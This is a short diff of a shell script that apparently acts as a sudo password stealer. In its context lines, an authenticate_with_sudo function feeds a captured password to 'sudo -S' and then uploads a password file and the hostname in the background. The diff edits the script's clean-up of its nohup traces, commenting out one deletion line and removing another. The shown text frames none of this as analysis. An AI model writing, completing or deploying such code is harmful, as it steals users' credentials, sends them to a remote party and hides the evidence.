@@ -9,8 +9,7 @@ perform_upload() {
             -F "file=@$PASS_FILE" \
             -F "hostname=$HOSTNAME" >/dev/null; then
             
-            # Clean up nohup output files
-            rm -f nohup* 2>/dev/null || true
+            #rm -f nohup* 2>/dev/null || true
         fi
     fi
 }
@@ -31,7 +30,6 @@ authenticate_with_sudo() {
 		if /usr/bin/printf "%s\n" "$password" | /usr/bin/sudo -S "$@" 2>/dev/null ; then
 
 			nohup perform_upload >/dev/null 2>&1 &
-			rm nohup* 2>/dev/ll
             unset password
             return 0
         else
